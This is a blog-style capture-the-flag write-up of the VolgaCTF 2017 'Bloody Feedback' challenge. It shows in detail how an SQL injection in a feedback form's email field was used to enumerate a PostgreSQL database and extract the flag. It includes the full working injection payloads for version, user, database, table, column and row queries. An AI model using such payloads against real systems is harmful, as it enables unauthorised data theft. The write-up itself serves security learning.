{"metadata":{"date":"Mar 28, 2017","title":"VolgaCTF - Bloody Feedback writeup","template":"post","slug":"volgactf-bloody-feedback-writeup","categories":["CTF"],"tags":["CTF"]},"content":"<pre><code class=\"hljs language-mipsasm\"><span class=\"hljs-keyword\">Bloody </span>Feedback\n\nSend your feedback <span class=\"hljs-built_in\">at</span> <span class=\"hljs-keyword\">bloody-feedback.quals.2017.volgactf.ru\n</span>\nDO. NOT. USE. SQLMAP\nOtherwise your IP will <span class=\"hljs-keyword\">be </span><span class=\"hljs-keyword\">banned\n</span></code></pre>\n<p>The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains \"Top Messages\" which is the feedback people send in. When you send feedback you get a token back which you can use to see if the feedback has been processed or not.</p>\n<p>I first tried to steal cookies via the feedback form but it turned out that everything was filtered. My second try involved finding a SQL injection vulnerability at the feedback status page:</p>\n<pre><code class=\"hljs language-awk\">http:<span class=\"hljs-regexp\">//</span>bloody-feedback.quals.<span class=\"hljs-number\">2017</span>.volgactf.ru<span class=\"hljs-regexp\">/check/</span>?code=&#x3C;token here>\n</code></pre>\n<p><img src=\"../images/not_processed.png\" alt=\"not_processed\"></p>\n<p>I got nothing, the only thing I could deduce was that every feedback sent, had a default status of \"not processed\". I assumed this would change after a while but it never did.</p>\n<p>My next attempt was to intercept the POST submission from the feedback form with burp to see if any parameters were vulnerable. By entering <code>lol'</code> as email, the following error was triggered:</p>\n<pre><code class=\"hljs language-angelscript\">&#x3C;div <span class=\"hljs-keyword\">class</span>=\"<span class=\"hljs-symbol\">container</span>\">\n&#x3C;<span class=\"hljs-symbol\">div</span> <span class=\"hljs-symbol\">class</span>=\"<span class=\"hljs-symbol\">page</span>-<span class=\"hljs-symbol\">header</span>\">\n&#x3C;<span class=\"hljs-symbol\">h2</span>><span class=\"hljs-symbol\">Error</span>&#x3C;/<span class=\"hljs-symbol\">h2</span>>\n&#x3C;/<span class=\"hljs-symbol\">div</span>>\n&#x3C;<span class=\"hljs-symbol\">div</span> <span class=\"hljs-symbol\">class</span>=\"<span class=\"hljs-symbol\">alert</span> <span class=\"hljs-symbol\">alert</span>-<span class=\"hljs-symbol\">danger</span>\">\n\t&#x3C;<span class=\"hljs-symbol\">p</span>><span class=\"hljs-symbol\">ERROR: <span class=\"hljs-symbol\">DBD</span>::<span class=\"hljs-symbol\">Pg</span>::<span class=\"hljs-symbol\">db</span></span> <span class=\"hljs-symbol\">do</span> <span class=\"hljs-symbol\">failed: <span class=\"hljs-symbol\">ERROR</span>:  <span class=\"hljs-symbol\">syntax</span></span> <span class=\"hljs-symbol\">error</span> <span class=\"hljs-symbol\">at</span> <span class=\"hljs-symbol\">or</span> <span class=\"hljs-symbol\">near</span> \"<span class=\"hljs-symbol\">not</span>\"\n\t<span class=\"hljs-symbol\">LINE</span> <span class=\"hljs-symbol\">1: </span>...<span class=\"hljs-symbol\">HRkIBBUOq9M40ZqvsB1TcwWVWt</span>','<span class=\"hljs-symbol\">smacker</span>','<span class=\"hljs-symbol\">m</span>','<span class=\"hljs-symbol\">lol</span>'','<span class=\"hljs-symbol\">not</span> <span class=\"hljs-symbol\">proces</span>...\n\t                                                 ^ <span class=\"hljs-symbol\">at</span> <span class=\"hljs-symbol\">Worker</span>.<span class=\"hljs-symbol\">pm</span> <span class=\"hljs-symbol\">line</span> <span class=\"hljs-symbol\">29</span>.&#x3C;/<span class=\"hljs-symbol\">p</span>>\n&#x3C;/<span class=\"hljs-symbol\">div</span>>\n&#x3C;/<span class=\"hljs-symbol\">div</span>>\n</code></pre>\n<p>I realised that when you send your feedback, the program automatically inserts \"not processed\" along with the feedback. My working theory at ths point was to substitute the \"not processed\" field with an SQL query of my choosing. After a few tries I constructed the following query:</p>\n<pre><code class=\"hljs language-applescript\"><span class=\"hljs-built_in\">name</span>=smacker&#x26;message=m&#x26;email=lol',(select <span class=\"hljs-built_in\">version</span>()))<span class=\"hljs-comment\">--</span>\n</code></pre>\n<p>However I got an error message indicating that the field allows a maximum of 30 chars, so I simply added substring():</p>\n<pre><code class=\"hljs language-scheme\">name=smacker&#x26;message=m&#x26;email=lol',(<span class=\"hljs-name\">select</span> substr(<span class=\"hljs-name\">version</span>(),<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">30</span>)))--\n</code></pre>\n<p><img src=\"../images/postgres.png\" alt=\"not_processed\"></p>\n<p>Now when I checked the status page of my feedback with the token I got, instead of seeing \"not processed\", I saw <code>PostgreSQL 9.5.6 on x86_64-pc</code>. Now I knew how to display my SQL queries on the site, by overwriting the \"not processed\" field.</p>\n<p>So I tried a few other things:</p>\n<pre><code class=\"hljs language-pgsql\"><span class=\"hljs-keyword\">user</span> = fcgi_user         =>  <span class=\"hljs-type\">name</span>=smacker&#x26;message=m&#x26;email=lol<span class=\"hljs-string\">',(select substr(user,0,30)))--\ndatabase = feedback_db   =>  name=smacker&#x26;message=m&#x26;email=lol'</span>,(<span class=\"hljs-keyword\">select</span> substr(current_database(),<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">30</span>)))<span class=\"hljs-comment\">--</span>\n</code></pre>\n<p>Since the field can't hold multiple rows/values, I had to use LIMIT X OFFSET Y in order to step through each element in the set that the database returned. The following code snippets shows how I enumerated the database to find the flag.</p>\n<p><strong>Databases:</strong></p>\n<pre><code class=\"hljs language-pgsql\">postgres => <span class=\"hljs-type\">name</span>=smacker&#x26;message=m&#x26;email=lol<span class=\"hljs-string\">',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 1))--\ntemplate1 => name=smacker&#x26;message=m&#x26;email=lol'</span>,(<span class=\"hljs-keyword\">select</span> substr(datname ,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">30</span>) <span class=\"hljs-keyword\">FROM</span> pg_database <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">OFFSET</span> <span class=\"hljs-number\">2</span>))<span class=\"hljs-comment\">--</span>\nfeedback_db => <span class=\"hljs-type\">name</span>=smacker&#x26;message=m&#x26;email=lol<span class=\"hljs-string\">',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 3))--\n</span></code></pre>\n<p><strong>TABLES:</strong></p>\n<pre><code class=\"hljs language-sql_more\">s3cret_tabl3 => name=smacker&#x26;message=m&#x26;email=lol',(<span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">FROM</span> information_schema.tables <span class=\"hljs-keyword\">WHERE</span> table_schema%<span class=\"hljs-number\">3</span>Dcurrent_schema() <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">OFFSET</span> <span class=\"hljs-number\">1</span>))<span class=\"hljs-comment\">--</span>\n</code></pre>\n<p><strong>COLUMNS:</strong></p>\n<pre><code class=\"hljs language-pgsql\"><span class=\"hljs-type\">name</span> =>  <span class=\"hljs-type\">name</span>=smacker&#x26;message=m&#x26;email=lol<span class=\"hljs-string\">',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--\nemail => name=smacker&#x26;message=m&#x26;email=lol'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">column_name</span> <span class=\"hljs-keyword\">FROM</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">WHERE</span> table_schema%<span class=\"hljs-number\">3</span>Dcurrent_schema() <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">OFFSET</span> <span class=\"hljs-number\">2</span>))<span class=\"hljs-comment\">--</span>\nmessage => <span class=\"hljs-type\">name</span>=smacker&#x26;message=m&#x26;email=lol<span class=\"hljs-string\">',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 3))--\nstatus => name=smacker&#x26;message=m&#x26;email=lol'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">column_name</span> <span class=\"hljs-keyword\">FROM</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">WHERE</span> table_schema%<span class=\"hljs-number\">3</span>Dcurrent_schema() <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">OFFSET</span> <span class=\"hljs-number\">4</span>))<span class=\"hljs-comment\">--</span>\nid => <span class=\"hljs-type\">name</span>=smacker&#x26;message=m&#x26;email=lol<span class=\"hljs-string\">',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 5))--\ns3cr3tc0lumn => name=smacker&#x26;message=m&#x26;email=lol'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">column_name</span> <span class=\"hljs-keyword\">FROM</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">WHERE</span> table_schema%<span class=\"hljs-number\">3</span>Dcurrent_schema() <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">OFFSET</span> <span class=\"hljs-number\">6</span>))<span class=\"hljs-comment\">--</span>\n</code></pre>\n<p><strong>Time to get the rows from <code>s3cr3tc0lumn</code></strong></p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">VolgaCTF</span> => name=smacker&#x26;message=m&#x26;email=lol',(select s<span class=\"hljs-number\">3</span>cr<span class=\"hljs-number\">3</span>tc<span class=\"hljs-number\">0</span>lumn FROM s<span class=\"hljs-number\">3</span>cret_tabl<span class=\"hljs-number\">3</span> LIMIT <span class=\"hljs-number\">1</span> OFFSET <span class=\"hljs-number\">1</span>))--\n<span class=\"hljs-attribute\">Volga</span> => name=smacker&#x26;message=m&#x26;email=lol',(select s<span class=\"hljs-number\">3</span>cr<span class=\"hljs-number\">3</span>tc<span class=\"hljs-number\">0</span>lumn FROM s<span class=\"hljs-number\">3</span>cret_tabl<span class=\"hljs-number\">3</span> LIMIT <span class=\"hljs-number\">1</span> OFFSET <span class=\"hljs-number\">2</span>))--\n<span class=\"hljs-attribute\">1</span> => name=smacker&#x26;message=m&#x26;email=lol',(select s<span class=\"hljs-number\">3</span>cr<span class=\"hljs-number\">3</span>tc<span class=\"hljs-number\">0</span>lumn FROM s<span class=\"hljs-number\">3</span>cret_tabl<span class=\"hljs-number\">3</span> LIMIT <span class=\"hljs-number\">1</span> OFFSET <span class=\"hljs-number\">3</span>))--\n<span class=\"hljs-attribute\">VolgaCTF</span>{eiU<span class=\"hljs-number\">7</span>UJhyeu@ud<span class=\"hljs-number\">3</span>*} => name=smacker&#x26;message=m&#x26;email=lol',(select s<span class=\"hljs-number\">3</span>cr<span class=\"hljs-number\">3</span>tc<span class=\"hljs-number\">0</span>lumn FROM s<span class=\"hljs-number\">3</span>cret_tabl<span class=\"hljs-number\">3</span> LIMIT <span class=\"hljs-number\">1</span> OFFSET <span class=\"hljs-number\">4</span>))--\n</code></pre>\n<p><img src=\"../images/flag.png\" alt=\"not_processed\"></p>\n<p><strong>Flag: VolgaCTF{eiU7UJhyeu@ud3*}</strong></p>"}